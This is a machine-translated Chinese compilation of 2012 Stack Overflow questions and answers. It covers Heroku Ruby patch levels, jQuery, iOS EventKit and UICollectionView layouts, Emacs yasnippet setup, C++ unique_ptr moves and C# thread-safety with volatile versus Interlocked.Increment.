几天前，发布了[ruby​​ 1.9.3p327](http://www.ruby-lang.org/en/news/2012/11/09/ruby-1-9-3-p327-is-released/)以处理[可能的 DoS](http://www.ruby-lang.org/en/news/2012/11/09/ruby19-hashdos-cve-2012-5371/)问题。

有没有办法在 Heroku 中升级 ruby​​ 版本？现在`ruby 1.9.3p286 (2012-10-12 revision 37165) [x86_64-linux]`当我将 ruby​​ "1.9.3" 放入我的 gemfile 时

**更新**

Heroku 将 cedar 上的 ruby​​ 版本更新为 p327

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T14:44:25.097

您不能在 Gemfile 中指定补丁号，只能设置版本号。Heroku 将管理补丁级别，因此您需要等到他们升级它。

看

*   [https://devcenter.heroku.com/articles/ruby-support](https://devcenter.heroku.com/articles/ruby-support)
*   [https://devcenter.heroku.com/articles/ruby-versions](https://devcenter.heroku.com/articles/ruby-versions)

# javascript - 创建支持 IE 和 Firefox 的视频播放器

> ID：13360935
> 
> 赞同：-2
> 
> 时间：2012-11-13T12:38:59.030
> 
> 标签：javascript

我在网页中创建视频播放器时遇到问题。我有一个视频标题列表和一个使用对象标签的视频播放器。

我的目的：当我点击视频标题时，它会加载视频并根据视频文件播放。

谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T13:12:08.610

**[试用演示](http://jsfiddle.net/tppiotrowski/v3xa5/)**

```
<a href="http://v2v.cc/~j/theora_testsuite/320x240.ogg">Test video</a><br>
<a href="http://upload.wikimedia.org/wikipedia/commons/9/9b/Pentagon_News_Sample.ogg">Pentagon</a><br>
<a href="http://upload.wikimedia.org/wikipedia/commons/thumb/1/14/Xacti-AC8EX-Sample_video-001.ogg/Xacti-AC8EX-Sample_video-001.ogg.480p.webm">Cat Giraffe</a><br>

<video id="player" src="http://v2v.cc/~j/theora_testsuite/320x240.ogg" controls>
  Your browser does not support the <code>video</code> element.
</video>​​​​​​​​​​​​​

<script type="text/javascript">
​$(function(e) {
    $('a').click(function(e) {
        e.preventDefault();
        var video_file = $(this).attr('href');
        $('#player').attr('src', video_file)[0].play();
    });        
});​
</script> 
```

# google-apps-script - 我在谷歌的脚本不起作用

> ID：13360936
> 
> 赞同：1
> 
> 时间：2012-11-13T12:39:09.047
> 
> 标签：google-apps-script

我正在尝试学习如何在谷歌中编写脚本。我在 Google Drive 中编写了以下脚本：

```
 function doGet() {
 return HtmlService.createHtmlOutput(
 "<form action='http://www.google.com' method='get' id='foo'></form>" + 
 "<script>document.getElementById('foo').submit();</script>");

 } 
```

当我运行它时，什么都没有出现！有谁能够帮我？

# ios - EKEvent AddAlarm 不工作

> ID：13360943
> 
> 赞同：1
> 
> 时间：2012-11-13T12:39:23.527
> 
> 标签：ios, calendar, alarm, ekevent

[固定]（有点）似乎你不能在事件结束时发出警报。我希望该事件在日历中出现 x 天，然后在它到期时发出警报以发出信号。似乎这是不可能的。只能在活动开始前发出警报。傻苹果:(

添加新事件时，我似乎无法保存警报。这是代码......我希望警报在事件发生时响起，我想也许全天选项会搞砸它，但无论如何它都不会保存。

这是代码...

```
EKEventStore *store = [[EKEventStore alloc] init];
EKEvent *event = [EKEvent eventWithEventStore:store];

event.title = title;
event.startDate = [global main].Entry.WithdrawalDate;
event.endDate = [global main].Entry.WithdrawalDate;
//event.allDay = YES;
event.availability = EKEventAvailabilityFree;
event.location = [global main].Holding.Name;
event.notes = [self compileNotes];

//Tried settings the array and adding to it, neither works
//NSArray *arrAlarm = [NSArray arrayWithObject:[EKAlarm alarmWithAbsoluteDate:[global main].Entry.WithdrawalDate]];
//event.alarms= arrAlarm;
EKAlarm * alarm = [EKAlarm alarmWithAbsoluteDate:[global main].Entry.WithdrawalDate];
[event addAlarm:alarm];

[event setCalendar:[store defaultCalendarForNewEvents]];
NSError *err;
saved = [store saveEvent:event span:EKSpanThisEvent commit:YES error:&err]; 
```

# javascript - 使用 translate3d 的 CSS 硬件加速的滑动菜单

> ID：13360956
> 
> 赞同：1
> 
> 时间：2012-11-13T12:40:10.433
> 
> 标签：javascript, jquery, html, css

我想要一个隐藏在页面顶部的菜单，单击按钮后它会向下滑动，以便将其下方的其他内容向下移动。我拥有的是隐藏菜单，我使用 jQuery 函数`slideDown()`来`slideUp()`切换它。问题是，例如。iPhone上的幻灯片不流畅，所以我想使用一些加速。

我只想按照[这里](http://davidwalsh.name/translate3d)`-webkit-trasnform: translate3d`的描述添加，但这似乎不适用于 jQuery 幻灯片功能。我也尝试使用但它也不起作用（我认为 jQuery 切换使用相同）。所以我发现，transform3d 可能仅适用于通过调整其坐标（左、上 ..）而不是宽度和高度来移动元素。`jQuery('.menu').animate({height: ..})`

我发现了这个 jQuery 插件[https://github.com/benbarnett/jQuery-Animate-Enhanced](https://github.com/benbarnett/jQuery-Animate-Enhanced)，它应该也有助于加速宽度和高度的变化，但在我的情况下它根本不起作用。

所以我设法通过调整 Top 属性并添加 translate3d 来移动菜单，这最终使菜单移动流畅，但现在我无法在菜单滑动时强制其下方的内容向下移动 - 如果菜单具有 position:relative 并且是移出屏幕，在内容的顶部仍然有一个与其高度相同的洞。如果它有 position:absolute ，它不会影响下面的内容。如果 position:static, Top: 属性没有影响。

我是否遗漏了什么或者什么是“推荐”的实现方式？[您可以在http://www.huureenkerstboom.nl](http://www.huureenkerstboom.nl)上查看当前实现（请缩小浏览器窗口以查看移动实现）。

# emacs - 如何使 yasnippet 作为自动完成后端？

> ID：13360957
> 
> 赞同：5
> 
> 时间：2012-11-13T12:40:19.403
> 
> 标签：emacs, autocomplete, yasnippet

我想`yasnippet`将`auto-complete`. 但是，它不起作用。我在网上搜索后的操作如下：获取[auto-complete-yasnippet.el](http://www.cx4a.org/pub/auto-complete-yasnippet.el)，添加一些 elisp`.emacs`如下：

```
(add-to-list 'load-path
     "~/.emacs.d/plugins/yasnippet")
(require 'yasnippet)
(yas-global-mode 1)
(yas-minor-mode nil)
(global-set-key (kbd "M-/") 'yas/expand)

;; Auto-complete settings
;; this is the code for the auto-complete
(require 'auto-complete-config)
(add-to-list 'ac-dictionary-directories "~/.emacs.d//ac-dict")
(ac-config-default)

;;setup for auto-complete-yasnippet
(require 'auto-complete-yasnippet)
(setq-default ac-sources
      '(
        ;; ac-source-semantic
        ac-source-yasnippet
        ac-source-abbrev
        ac-source-words-in-buffer
        ac-source-words-in-all-buffer
        ;; ac-source-imenu
        ac-source-files-in-current-dir
        ac-source-filename
        )
      ) 
```

我用 . 查看`ac-sources`*scratch* 中的内容`C-h v`，它确实有`ac-source-yasnippet`. 有人[说](http://www.emacswiki.org/emacs/AutoComplete)可能是`auto-complete`as的版本和升级有问题`yasnippet`。如何修复？我的`emacs`版本是 23.3.1 我的`auto-complete`版本是 1.3.1 我的`yasnippet`版本是 0.8.0(beta) 是刚刚从[github](https://github.com/capitaomorte/yasnippet)下载的。有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-14T08:22:16.827

版本中`auto-complete-config.el`获取时可能有问题：`ac-yasnippet-candidates``auto-complete-1.3.1`

```
(defun ac-yasnippet-candidates ()
  (with-no-warnings
    (if (fboundp 'yas/get-snippet-tables)
        ;; >0.6.0
        (apply 'append (mapcar 'ac-yasnippet-candidate-1 (yas/get-snippet-tables major-mode)))
      (let ((table
             (if (fboundp 'yas/snippet-table)
                 ;; <0.6.0
                 (yas/snippet-table major-mode)
               ;; 0.6.0
               (yas/current-snippet-table))))
        (if table
            (ac-yasnippet-candidate-1 table)))))) 
```

必须更改上面的代码片段以与`yasnippet-0.8.0`版本兼容。`auto-complete-1.4.0`我从[github](https://github.com/m2ym/auto-complete)下载了最新版本的，它解决了判断版本`yasnippet`并采取相应措施的问题。像这样：

```
(defun ac-yasnippet-candidates ()
  (with-no-warnings
    (cond (;; 0.8 onwards
           (fboundp 'yas-active-keys)
           (all-completions ac-prefix (yas-active-keys)))
          (;; >0.6.0
           (fboundp 'yas/get-snippet-tables)
           (apply 'append (mapcar 'ac-yasnippet-candidate-1
                                  (condition-case nil
                                      (yas/get-snippet-tables major-mode)
                                    (wrong-number-of-arguments
                                     (yas/get-snippet-tables))))))
          (t
           (let ((table
                  (if (fboundp 'yas/snippet-table)
                      ;; <0.6.0
                      (yas/snippet-table major-mode)
                    ;; 0.6.0
                    (yas/current-snippet-table))))
             (if table
                 (ac-yasnippet-candidate-1 table))))))) 
```

`auto-complete-config.el`我从版本中复制`auto-complete-1.4.0`，字节编译它，并在版本中替换了相同的文件（`auto-complete-config.el`和`auto-complete-config.elc`）`auto-complete-1.3.1`。它刚刚奏效！我认为配置文件可能`auto-complete`不应该包含在发行版中，并且可能应该单独维护以使其易于与其后端兼容。

我重新配置了`yasnippet`这样的`auto-complete`：

```
;; setup for yasnippet
(add-to-list 'load-path
      "~/.emacs.d/plugins/yasnippet")
;; Extension and configuration of yasnippet.
(require 'yasnippet-config)
;; If you use yasnippet from 'auto-complete', add
(yas/set-ac-modes)
(yas/enable-emacs-lisp-paren-hack)
;; before 'auto-complete' settings.
;; Auto-complete settings
;; this is the code for the auto-complete
(require 'auto-complete-config)
(add-to-list 'ac-dictionary-directories "~/.emacs.d//ac-dict")
(ac-config-default) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-14T08:05:37.067

你可以很容易地做到这一点`(require 'auto-complete-yasnippet)`

然后你可以改变你的自动完成，如下所示：

```
(defun my-ac-config ()
  (setq-default ac-sources '(ac-source-abbrev ac-source-dictionary ac-source-words-in-same-mode-buffers))
  (add-hook 'emacs-lisp-mode-hook 'ac-emacs-lisp-mode-setup)
  ;; (add-hook 'c-mode-common-hook 'ac-cc-mode-setup)
  (add-hook 'ruby-mode-hook 'ac-ruby-mode-setup)
  (add-hook 'css-mode-hook 'ac-css-mode-setup)
  (add-hook 'auto-complete-mode-hook 'ac-common-setup)
  (add-hook 'octave-mode-hook 'ac-octave-mode-setup)
  (global-auto-complete-mode t))
(defun my-ac-cc-mode-setup ()
  (setq ac-sources (append '(ac-source-clang ac-source-yasnippet) ac-sources)))
(add-hook 'c-mode-common-hook 'my-ac-cc-mode-setup)
;; ac-source-gtags
(my-ac-config) 
```

它在我的机器上运行良好。

# c++ - MSVC 无法向上转换 unique_ptr

> ID：13360959
> 
> 赞同：1
> 
> 时间：2012-11-13T12:40:29.327
> 
> 标签：c++, c++11

以下代码在 MSVC11 上失败并出现错误

```
cannot convert parameter 1 from 'std::unique_ptr<DerivedClass>' to 'std::unique_ptr<BaseClass>' 
```

编码：

```
class BaseClass
{ };

class DerivedClass : public BaseClass
{ };

void MyFunction(std::unique_ptr<BaseClass> obj)
{ };

int main()
{
      auto ptr = std::unique_ptr<DerivedClass>(new DerivedClass);
      MyFunction(ptr);                 // fails, with error about cannot convert type
      // MyFunction(std::move(ptr));   // This will work
} 
```

正如答案中指出的那样，原因`std::move`丢失了，但是错误消息使我感到困惑以至于无法发布问题，因此我对其进行了更新，因此任何同样困惑的人都有最好的机会找到答案。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-13T12:41:59.320

您的错误与向上或向下投射无关。您正在尝试复制`ptr`，这是不允许的。如果您通过`std::move(ptr)`，则转换将是隐式和自动的，就像常规指针一样。

# c# - 并发问题：并行写入

> ID：13360966
> 
> 赞同：5
> 
> 时间：2012-11-13T12:41:26.870
> 
> 标签：c#, concurrency, task-parallel-library

有一天，我试图更好地理解线程概念，所以我写了几个测试程序。其中之一是：

```
using System;
using System.Threading.Tasks;
class Program
{
    static volatile int a = 0;

    static void Main(string[] args)
    {
        Task[] tasks = new Task[4];

        for (int h = 0; h < 20; h++)
        {
            a = 0;
            for (int i = 0; i < tasks.Length; i++)
            {
                tasks[i] = new Task(() => DoStuff());
                tasks[i].Start();
            }
            Task.WaitAll(tasks);
            Console.WriteLine(a);
        }
        Console.ReadKey();
    }

    static void DoStuff()
    {
        for (int i = 0; i < 500000; i++) 
        {
            a++;
        }
    }
} 
```

我希望我能看到小于 2000000 的输出。我想象中的模型如下：更多线程同时读取变量 a，a 的所有本地副本都将相同，线程递增它并发生写入并且一个或多个增量以这种方式“丢失”。

虽然输出违背了这个推理。一个示例输出（来自 corei5 机器）：

```
2000000
1497903
1026329
2000000
1281604
1395634
1417712
1397300
1396031
1285850
1092027
1068205
1091915
1300493
1357077
1133384
1485279
1290272
1048169
704754 
```

如果我的推理是真的，我偶尔会看到 2000000，有时数字会少一些。但是我偶尔看到的是 2000000，而数字远小于 2000000。这表明幕后发生的不仅仅是几个“增量损失”，而是更多的事情正在发生。有人可以解释一下情况吗？

编辑：当我编写这个测试程序时，我完全知道如何使这个线程安全，并且我希望看到小于 2000000 的数字。让我解释一下为什么我对输出感到惊讶：首先让我们假设上面的推理是正确的。第二个假设（这很可能是我困惑的根源）：如果冲突发生（并且确实发生了），那么这些冲突是随机的，我希望这些随机事件的发生在某种程度上是正态分布。在这种情况下，输出的第一行说：从 500000 次实验中，随机事件从未发生过。第二行说：随机事件至少发生了 167365 次。0 和 167365 之间的差异太大（正态分布几乎不可能）。所以案例归结为以下几点：两个假设之一（“增量损失” 模型或“有点正态分布的并行冲突”模型）不正确。哪个是，为什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-13T12:59:03.930

该行为源于您在使用[增量运算符 (](http://msdn.microsoft.com/en-us/library/36x43w8w.aspx) [)](http://msdn.microsoft.com/en-us/library/36x43w8w.aspx)时同时使用[`volatile`关键字](http://msdn.microsoft.com/en-us/library/x13ttww7%28v=vs.110%29.aspx)以及未锁定对变量的访问这一事实（尽管在不使用时您仍然会得到随机分布，但 using确实会改变分布的性质，这将在下面进行探讨）。`a`[`++`](http://msdn.microsoft.com/en-us/library/36x43w8w.aspx)`volatile``volatile`

使用增量运算符时，它相当于：

```
a = a + 1; 
```

在这种情况下，您实际上是在执行*三个*操作，而不是一个：

1.  读取值`a`
2.  值加 1`a`
3.  将 2 的结果分配回`a`

虽然`volatile`关键字序列化访问，但在上述情况下，它是对*三个*独立操作的序列化访问，而不是对它们的集体序列化访问，作为一个原子工作单元。

因为您在递增而不是*1时执行**了三个*操作，所以您有被删除的添加。

 *考虑一下：

```
Time    Thread 1                 Thread 2
----    --------                 --------
   0    read a (1)               read a (1)
   1    evaluate a + 1 (2)       evaluate a + 1 (2)
   2    write result to a (3)    write result to a (3) 
```

甚至这样：

```
Time    a    Thread 1               Thread 2           Thread 3
----    -    --------               --------           --------
   0    1    read a                                    read a
   1    1    evaluate a + 1 (2)
   2    2    write back to a
   3    2                           read a
   4    2                           evaluate a + 1 (3)
   5    3                           write back to a
   6    3                                              evaluate a + 1 (2)
   7    2                                              write back to a 
```

特别注意步骤 5-7，线程 2 已将一个值写回 a，但由于线程 3 有一个旧的、陈旧的值，它实际上覆盖了先前线程已写入的结果，基本上消除了这些增量的任何痕迹。

如您所见，当您添加更多线程时，您更有可能混淆执行操作的顺序。

`volatile`将防止您`a`由于同时发生两次写入而损坏 的值，或者`a`由于在读取期间发生写入而导致读取损坏，但在这种情况下它不会做任何事情来处理使操作原子化（因为您正在执行*三个*操作）。

在这种情况下，`volatile`由于`a`对`a`. 如果没有`volatile`，您将面临`a`成为*任何东西*`a`的风险，因为当读取和/或写入同时发生时，您可能会遇到值损坏。

因为您没有对整个增量操作进行同步访问`a`，*所以*结果是不可预测的，因为您有被覆盖的写入（如前面的示例所示）。

**你的情况是怎么回事？**

对于您的特定情况，您有**许多**写入被覆盖，而不仅仅是*几个*；由于您有四个线程，每个线程都编写了一个循环 200 万次，理论上*所有的写入都可以被覆盖*（将第二个示例扩展到四个线程，然后只需添加几百万行来增加循环）。

虽然这不太*可能*，但不应期望您*不会*丢弃大量写入。

此外，`Task`是一个抽象。实际上（假设您使用的是默认调度程序），它使用[`ThreadPool`该类](http://msdn.microsoft.com/en-us/library/system.threading.threadpool.aspx)来获取线程来处理您的请求。最终`ThreadPool`与*其他*操作共享（一些在 CLR 内部，即使在这种情况下也是如此），即便如此，它也会执行诸如工作窃取、使用当前线程进行操作并最终在某些时候下降到操作系统的*事情级别*来获得一个线程来执行工作。

因此，您不能假设随机分布的覆盖会被跳过，因为*总会*有更多的事情发生，这会抛出您期望的任何顺序。*处理的顺序是不确定的，工作的分配永远不会均匀分布*。

如果要确保不会覆盖添加的内容，则应在方法中使用该[`Interlocked.Increment`方法](http://msdn.microsoft.com/en-us/library/dd78zt0c.aspx)，`DoStuff`如下所示：

```
for (int i = 0; i < 500000; i++)
{
    Interlocked.Increment(ref a);
} 
```

这将确保所有写入都会发生，并且您的输出将是`2000000`20 次（根据您的循环）。

它还使对`volatile`关键字的需求无效，因为您正在使您需要原子的操作。

`volatile`当您需要使原子化的操作仅限于单个读取或写入时，该关键字很好。

如果你必须做的*不仅仅是*读或写，那么`volatile`关键字*太*细了，你需要一个更粗略的锁定机制。

在这种情况下，它是`Interlocked.Increment`，但如果您有更多事情要做，那么该[`lock`语句](http://msdn.microsoft.com/en-us/library/c5kehkcz.aspx)很可能就是您所依赖的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:59:13.223

我不认为这会发生其他任何事情——它只是发生了很多。如果您添加“锁定”或其他一些同步技术（[将整数递增到 65535 的最佳线程安全方法](https://stackoverflow.com/questions/8698461/best-thread-safe-way-to-increment-an-integer-up-to-65535)），您将可靠地获得完整的 2,000,000 增量。

正如您所期望的那样，每个任务都在调用 DoStuff()。

```
private static object locker = new object();

static void DoStuff()
{
    for (int i = 0; i < 500000; i++)
    {
        lock (locker)
        {
            a++;
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T13:37:06.160

尝试增加数量，时间跨度很短，无法得出任何结论。请记住，正常的 IO 在毫秒范围内，在这种情况下，只有一个阻塞 IO-op 会使结果变得无用。

类似这样的东西更好：（或者为什么不是 intmax？）

```
 static void DoStuff()
     {
        for (int i = 0; i < 50000000; i++) // 50 000 000
           a++;
     } 
```

我的结果（“正确”为 400 000 000）：

```
63838940
60811151
70716761
62101690
61798372
64849158
68786233
67849788
69044365
68621685
86184950
77382352
74374061
58356697
70683366
71841576
62955710
70824563
63564392
71135381 
```

不是真正的正态分布，但我们正在到达那里。请记住，这大约是正确数量的 35%。

我可以解释我的结果，因为我在 2 个物理内核上运行，尽管由于超线程而被视为 4 个，这意味着如果在实际添加期间执行“ht-switch”是最佳的，至少 50% 的添加将是“删除”（如果我记得 ht 的实现正确的话（即在加载/保存其他线程数据的同时修改 ALU 中的一些线程数据）。剩下的 15% 是由于程序实际在 2 个内核上并行运行。

我的建议

*   发布您的硬件
*   增加循环次数
*   改变TaskCount
*   硬件很重要！*

# javascript - 让 jQuery 使用 :not() 选择器工作

> ID：13360967
> 
> 赞同：1
> 
> 时间：2012-11-13T12:41:30.057
> 
> 标签：javascript, jquery

在我的代码中，我添加了这个变量

```
var spellSpace = $('td[data-word=' + listOfWords[rndWord].name + ']').hasClass('.highlight-problem:not(.right-word)'); 
```

并且由于某种原因，它在此代码中不起作用

```
$('.next-question').click(function () {
    $('td').removeClass('highlight-problem');
    var r = rndWord;
    while (r == rndWord) {
        rndWord = Math.floor(Math.random() * (listOfWords.length));
    }
    $('td[data-word="' + listOfWords[rndWord].name + '"]').addClass('highlight-problem');
    $('td[data-word=' + word + ']').removeClass('wrong-letter').removeClass('wrong-word').removeClass('right-letter');
    var spellSpace = $('td[data-word=' + listOfWords[rndWord].name + ']').hasClass('.highlight-problem:not(.right-word)');
    if (spellSpace) {
        addMedia();
    }
}); 
```

它只是不会返回 addMedia() 函数，我不知道为什么

谁能告诉我哪里出错了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T12:42:27.900

`hasClass`获取类名作为参数，而不是选择器。您可以[`is()`](http://api.jquery.com/is/)改用：

```
var spellSpace = $('td[data-word="' + listOfWords[rndWord].name + '"]')
    .is('.highlight-problem:not(.right-word)'); 
```

或者可能是以下内容：

```
var spellSpace = $('td[data-word="' + listOfWords[rndWord].name
    + '"].highlight-problem:not(.right-word)').length > 0; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-13T12:45:02.567

jQuery`hasClass`函数不能接受 css 选择器：[http ://api.jquery.com/hasClass/](http://api.jquery.com/hasClass/)

使用`is`：[http ://api.jquery.com/is/](http://api.jquery.com/is/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-13T12:43:52.730

或者，您可以尝试使用 jQuery [not()](http://api.jquery.com/not/)过滤器。

```
var spellSpace = $('td[data-word=' + listOfWords[rndWord].name + ']').hasClass('highlight-problem').not('.right-word'); 
```

# ios6 - UICollectionViewLayout 示例

> ID：13360973
> 
> 赞同：3
> 
> 时间：2012-11-13T12:41:55.173
> 
> 标签：ios6, uicollectionview, uicollectionviewlayout

谁能指出我如何使用 UICollectionViewLayout 创建类似于 Pinterest 列布局的界面的正确方向？

我尝试在网上搜索，但似乎还没有很多例子。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-06-21T02:20:25.523

1000memories “Quilt” 视图类似于 pinterest 并且是开源的：[http](http://blog.1000memories.com/168-opensourcing-quilt) ://blog.1000memories.com/168-opensourcing-quilt ，您可以深入了解它是如何工作的。

如果您正在寻找更概念性的概述，这里是您想要做什么的基本概念。到目前为止，如果您只需要 Pinterest 风格的布局，最简单的事情就是子类化`UICollectionViewFlowLayout`. 你可以从这个类中获得很多布局帮助，Pinterest 风格在它的能力范围内。您只需要覆盖一种方法。

使用 UICollectionViewFlow 布局设置一个普通的 UICollectionView。一个快速的方法是：

*   将 UIViewController 拖到情节提要上，将 UICollectionView 放在上面。设置类以匹配您的自定义类等。您可以在此处使用委托并创建一个委托类，但严格来说，这不是实现 Pinterest 流布局所必需的（您几乎肯定希望将选择责任的内容分解为但实际上是委托类）。
*   存根数据源。为 UICollectionView ( [http://developer.apple.com/library/ios/#documentation/uikit/reference/UICollectionViewDataSource_protocol/Reference/Reference.html](http://developer.apple.com/library/ios/#documentation/uikit/reference/UICollectionViewDataSource_protocol/Reference/Reference.html) ) 实现数据源协议非常简单。确保在 UICollectionViewCell 上设置重用标识符。你需要：
    1.  `(NSInteger)numberOfSectionsInCollectionView:(UICollectionView *)collectionView`
        *   现在只返回 1；
    2.  `(NSInteteger)collectionView:numberOfItemsInSection:`
        *   现在硬编码一个数字，让它变成 20。
    3.  –`(UICollectionViewCell *)collectionView:cellForItemAtIndexPath:`
        *   这是对流布局进行子类化的地方之一。您在这里真正需要做的就是`dequeueReusableCellWithReuseIdentifier:forIndexPath:`使用索引路径调用。如果您向单元格添加了 UIImageView 或一些标签，这将是实际分配图像、文本等的好地方。
*   在 viewController 的`viewDidLoad`实例化 a`UICollectionViewFlowLayout`并将 UICollectionView 的数据源设置为您的，并将布局设置为 flowlayout。请记住，这个类是`UICollectionViewViewController`.

    ```
    self.collectionView.dataSource = [[YourDataSource alloc] init];
    self.collectionView.collectionViewLayout = [[UICollectionViewFlowLayout alloc] init]; 
    ```

好的。此时，您应该能够运行您的应用程序并在屏幕上看到一些内容。这是一个旋风式的概述。如果您需要有关如何设置 ViewController 等的更多详细信息，那么有很多可用的资料。

现在到了重要的部分，Pinterest 化流布局。

首先，添加一个新类，它是 UIViewControllerFlowLayout 的子类。更改您的 ViewController`viewDidLoad`以实例化此类并分配为`UICollectionView`'s `collectionViewLayout`。

您将需要实现的方法是`- (NSArray *)layoutAttributesForElementsInRect:(CGRect)rect`.

事情是这样的：超类将为您完成几乎所有的工作。您的代码将如下所示：

```
- (NSArray *)layoutAttributesForElementsInRect:(CGRect)rect
{
    NSArray *attributes = [super layoutAttributesForElementsInRect:rect]; 
    [attributes enumerateObjectsUsingBlock:^(id attr, NSUInteger idx, BOOL *stop) {
    float newYCoord = [calculationMethodYouHaveToWriteFor:attr.frame];
    attr.frame = CGRectMake(attr.frame.origin.x, newYCoord, attr.size.width, attr.size.height];
}];

} 
```

Pinterest 使用固定宽度的列，您在计算方法中需要做的就是找出您所在的列（`attr.origin.x / _columnWidth），然后从您的 ivar 中查找该列的总高度一直保存它。不要忘记将它添加到新对象的高度并将其保存回来以供下一次通过。

流布局超类处理：制作单元格，确定哪些单元格可见，确定内容大小，确定行在 x 方向上的排列，为单元格分配索引路径。很多垃圾。压倒这一种方法可以让您根据自己的心愿摆弄 y-pos。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-27T14:30:31.830

来自github的两个

[https://github.com/jayslu/JSPintDemo](https://github.com/jayslu/JSPintDemo)

[https://github.com/chiahsien/UICollectionViewWaterfallLayout](https://github.com/chiahsien/UICollectionViewWaterfallLayout)

我现在在一个项目中使用了 Waterfall 的修改版本，我现在正在研究 JSPint。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-08-27T07:24:02.267

我创建了一个自定义 uicollectionviewlayout，用于我的个人项目。链接在这里。希望能帮助到你。

[https://github.com/johnny0614/YJZAlbumCollectionViewLayout](https://github.com/johnny0614/YJZAlbumCollectionViewLayout)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-03-02T11:25:40.373

你可以从这里得到你想要的任何东西： [https](https://github.com/ParsifalC/CPCollectionViewKit) ://github.com/ParsifalC/CPCollectionViewKit 例如（这两个布局都是自定义 UICollectionViewLayout）：

![过渡布局](../Images/e389688a99b6c01efe97d1089f9d38da.png)

# ios - UICollectionView 的单元格消失

> ID：13360975
> 
> 赞同：59
> 
> 时间：2012-11-13T12:42:02.297
> 
> 标签：ios, xcode, uicollectionview, uicollectionviewcell

**发生了什么**

目前我有一个`UICollectionViews`在`UITableView`. 通过这种方式，我创建了一个看起来像 Pulse News 的应用程序。我的问题是，有时第 6 行和第 11 行会完全消失，在应该是单元格的地方留下一个空白区域。我实际上并不介意，如果所有的细胞都是这样的（这样我可以假设我没有正确地做事），但问题是，只是发生在那些特定的细胞上。

**我的理论**

第 6 行和第 11 行是我开始滚动时出现的行，所以默认情况下我可以看到 5 个单元格，当我第一次水平滚动时，第 6 行出现（有时是空白）。

**是）我有的**

我现在唯一要做的就是：

```
 [self.collectionView registerNib:[UINib nibWithNibName:CELL_NIB_NAME bundle:nil] forCellWithReuseIdentifier:CELL_IDENTIFIER]; 
```

在`viewDidLoad`. 在创建单元格时：

```
- (UICollectionViewCell *)collectionView:(UICollectionView *)collectionView cellForItemAtIndexPath:(NSIndexPath *)indexPath
{
    MyCell *cell = [collectionView dequeueReusableCellWithReuseIdentifier:CELL_IDENTIFIER forIndexPath:indexPath];

    NSMutableDictionary *dictionary = [self.DataSource objectAtIndex:[indexPath row]];

    [cell buildViewWithDictionary:dictionary withReferenceParent:self.referenceViewController];

    return cell;
} 
```

因此，在我的低估中，这里没有什么好看的。我虽然数据源（一个虚拟的 JSON 文件）有问题，但有时它可以正常工作并且单元格显示，所以我猜从那部分是可以的。

所以我的“问题”：有人知道发生了什么吗？我真的不想说这是 iOS 的错误，但我想不出别的。

* * *

**编辑 1.0**

令人惊奇的是，这种方法

```
-(UICollectionViewCell *)collectionView:(UICollectionView *)collectionView cellForItemAtIndexPath:(NSIndexPath *)indexPath; 
```

在不计算 [0,5] 的情况下从`indexPath`[0,4] 变为 [0,6]。我第一次在 iOS 中真正看到这种情况。

* * *

**编辑 2.0**

我改变了创建单元格的方式，而不是出队，我使用的是旧方式：

```
NSArray *nib = [[NSBundle mainBundle] loadNibNamed:CELL_NIB_NAME owner:self options:nil];
MyCell *cell = (MyCell *)[nib objectAtIndex:0]; 
```

还是一样的悲惨结果。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-11-13T21:02:32.917

那么，什么起作用了？

1）子类`UICollectionViewFlowLayout`。

2）将我的flowLayout设置`UICollectionView`为我的新子类。

3）在`UICollectionViewFlowLayout`子类的init方法上，设置你想要的方向：

```
self.scrollDirection = UICollectionViewScrollDirectionHorizontal; 
```

就我而言，它是水平的。

4)**重要部分**：

```
-(BOOL)shouldInvalidateLayoutForBoundsChange:(CGRect)newBounds
{
   return YES;
} 
```

此刻，我应该有点理论，但老实说，我没有头绪。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2015-06-26T18:21:27.533

上面的答案对我不起作用，但是在下载图像后，我将代码替换 `[self.myCollectionView reloadData]` 为 `[self.myCollectionView reloadSections:[NSIndexSet indexSetWithIndex:0]];` 刷新 collectionview 并显示所有单元格，您可以尝试一下。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2015-11-20T10:53:12.250

任何人提供的解决方案都没有帮助我实现我们需要在我们的应用程序中拥有的自定义布局。相反，我必须这样做：（是的，**它**可以工作！！！）

```
- (NSArray *)layoutAttributesForElementsInRect:(CGRect)rect{
    CGSize size = [self collectionViewContentSize];
    rect.size.height = size.height*2;
    NSArray *atrributes_Super = [super layoutAttributesForElementsInRect:rect];
    return atrributes_Super;
} 
```

毕竟， UICollectionView 只是在寻找要在屏幕矩形中显示的元素的属性。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-01-16T03:38:21.040

Rob 关于这个错误的提示帮助了我。该错误指出，如果部分插图和单元格的宽度和间距加起来正好等于屏幕的宽度，那么第一列有时会随机消失并在某些地方的某些单元格中重新出现。我没有子类化或更改单元格宽度，而是将故事板中左右的部分插图从 6 更改为 4，但我再也没有看到问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-09-19T04:02:33.623

在我的情况下（垂直滚动，单元格在第一个视图中消失），由于估计大小不正确，单元格正在消失。看来，`UICollectionView`使用估计的大小来计算要在第一个视图中加载的项目。我将估计大小设置得太高，这导致在第一个屏幕中加载的项目数量计算错误。

当我将估计的高度设为低时，所有单元格都正确显示。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-01-08T04:47:09.610

